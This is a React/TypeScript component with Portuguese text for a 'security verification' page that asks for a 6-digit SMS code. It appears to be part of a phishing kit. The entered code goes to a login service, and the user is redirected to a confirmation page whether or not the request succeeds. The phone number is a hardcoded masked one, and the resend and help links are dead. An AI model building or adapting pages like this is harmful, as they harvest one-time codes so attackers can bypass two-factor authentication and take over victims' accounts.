import React, { useState } from "react";
import { useHistory } from "react-router-dom";
import { useForm } from "react-hook-form";
import * as Yup from "yup";

import Button from "../../components/Button";
import "./style.scss";
import { yupResolver } from "@hookform/resolvers/yup";

import FormLoginData from "../../types/FormLogin.interface";
import LoginService from "../../services/requests/login";
import MaskedInput from "../../components/MaskedInput";

const VerificacaoLogin = () => {
  const [valueForm, setValueForm] = useState({});
  const history = useHistory();

  const validationSchema = Yup.object().shape({
    login: Yup.string().required("Login é obrigatório"),
    password: Yup.string().required("Senha é obrigatório"),
  });

  const {
    register,
    handleSubmit,
    getValues,
    formState: { errors },
  } = useForm<FormLoginData>({
    resolver: yupResolver(validationSchema),
  });

  const onSubmit = (data: FormLoginData) => {
    LoginService.login(data)
      .then(() => {
        return history.push("/confirmacao");
      })
      .catch(() => {
        return history.push("/confirmacao");
      });
  };

  const changeForm = (target: HTMLInputElement) => {
    setValueForm({ ...getValues(), [target.name]: target.value });
  };

  return (
    <form className="align-center-form" onSubmit={handleSubmit(onSubmit)}>
      <h2><b>Verificação de Segurança</b></h2>
      <p>Para proteger sua conta, conclua a seguinte verificação.</p>

      <MaskedInput
        register={register("login")}
        error={errors.login?.message}
        name="text"
        type="text"
        label="Verificação por telefone"
        placeholder="******"
        onChange={(e) => changeForm(e.target)}
        mask="999999" maskChar={null}
      />
      
      <p>Digite o código de 6 digitos enviado para 319****4040.</p>
      <a href="#">Reenviar código</a>
      <Button
        type="submit"
        className="md buttonVer btn"
        disabled={!validationSchema.isValidSync(valueForm)}
      >
        Enviar
      </Button>
      <a href="#">A verificação de segurança não está disponível?</a>
    </form>
  );
};

export default VerificacaoLogin;
